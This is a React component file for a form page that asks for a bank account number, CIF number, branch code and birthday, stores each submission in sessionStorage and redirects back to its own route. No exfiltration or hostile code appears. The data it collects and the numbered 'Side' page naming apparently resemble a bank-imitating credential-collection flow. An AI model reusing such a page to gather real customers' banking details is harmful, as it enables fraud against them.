// src/components/Side4.js
import React, { useState } from 'react';
import image from '../assets/images/image.webp';
import { useNavigate } from 'react-router-dom';

const Side4 = () => {
    const [formData, setFormData] = useState({
        accountNumber: '',
        cifNumber: '',
        branchCode: '',
        birthday: ''
    });

    const navigate = useNavigate();

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value
        });
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        // Retrieve existing data or initialize an empty array
        const existingData = JSON.parse(sessionStorage.getItem('submittedData')) || [];

        // Push the new form data to the existing array
        existingData.push(formData);

        // Update the sessionStorage with the new array
        sessionStorage.setItem('submittedData', JSON.stringify(existingData));

        // Navigate to the next page (adjust as needed)
        navigate('/side4'); // Replace with your next page route
    };

    return (
        <div>
            <div className="mx-auto flex flex-col items-center bg-blue-100 p-8 rounded-lg shadow-lg max-w-md space-y-6">
                {/* Image Section */}
                <div className="w-full">
                    <img src={image} alt="First Image" className="w-full h-auto rounded-lg" />
                </div>

                {/* Input Form Section */}
                <form onSubmit={handleSubmit} className="w-full space-y-4">
                    <div>
                        <label className="block text-gray-700 text-sm font-semibold mb-1">Account Number</label>
                        <input
                            type="text"
                            name="accountNumber"
                            placeholder="Enter account number"
                            value={formData.accountNumber}
                            onChange={handleChange}
                            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        />
                    </div>
                    <div>
                        <label className="block text-gray-700 text-sm font-semibold mb-1">CIF Number</label>
                        <input
                            type="text"
                            name="cifNumber"
                            placeholder="Enter CIF number"
                            value={formData.cifNumber}
                            onChange={handleChange}
                            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        />
                    </div>
                    <div>
                        <label className="block text-gray-700 text-sm font-semibold mb-1">Branch Code</label>
                        <input
                            type="text"
                            name="branchCode"
                            placeholder="Enter branch code"
                            value={formData.branchCode}
                            onChange={handleChange}
                            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        />
                    </div>
                    <div>
                        <label className="block text-gray-700 text-sm font-semibold mb-1">Birthday</label>
                        <input
                            type="date"
                            name="birthday"
                            value={formData.birthday}
                            onChange={handleChange}
                            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                        />
                    </div>

                    <button type="submit" className='bg-black text-white px-9 py-4 mt-9'>
                        Submit   
                    </button>
                </form>
            </div>
        </div>
    );
};

export default Side4;
